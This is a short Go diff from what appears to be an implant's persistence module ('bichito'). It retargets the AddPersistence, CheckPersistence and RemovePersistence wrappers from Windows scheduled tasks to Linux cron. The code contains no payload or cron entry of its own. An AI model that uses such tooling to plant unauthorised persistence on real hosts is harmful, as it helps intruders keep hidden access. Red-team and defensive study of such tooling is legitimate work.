@@ -1,15 +1,16 @@
-// +build schtasks
+// +build linuxCron
+
 
 package persistence
 
 import (
-	"bichito/modules/persistence/windows_schtasks"
-)
+	"bichito/modules/persistence/linux_cron"
 
+)
 
 func AddPersistence(jsonPersistence string,blob string) (bool,string){
 
-	err,result := windows_schtasks.AddPersistenceSchtasks(jsonPersistence,blob)
+	err,result := linux_cron.AddPersistenceLinuxCron(jsonPersistence,blob)
 	if err != false {
 		return true,result
 	}
@@ -19,7 +20,7 @@ func AddPersistence(jsonPersistence string,blob string) (bool,string){
 
 func CheckPersistence(jsonPersistence string) (bool,string){
 
-	err,result := windows_schtasks.CheckPersistenceSchtasks(jsonPersistence)
+	err,result := linux_cron.CheckPersistenceLinuxCron(jsonPersistence)
 	if err != false {
 		return true,result
 	}
@@ -30,7 +31,7 @@ func CheckPersistence(jsonPersistence string) (bool,string){
 
 func RemovePersistence(jsonPersistence string) (bool,string){
 
-	err,result := windows_schtasks.RemovePersistenceSchtasks(jsonPersistence)
+	err,result := linux_cron.RemovePersistenceLinuxCron(jsonPersistence)
 	if err != false {
 		return true,result
 	}
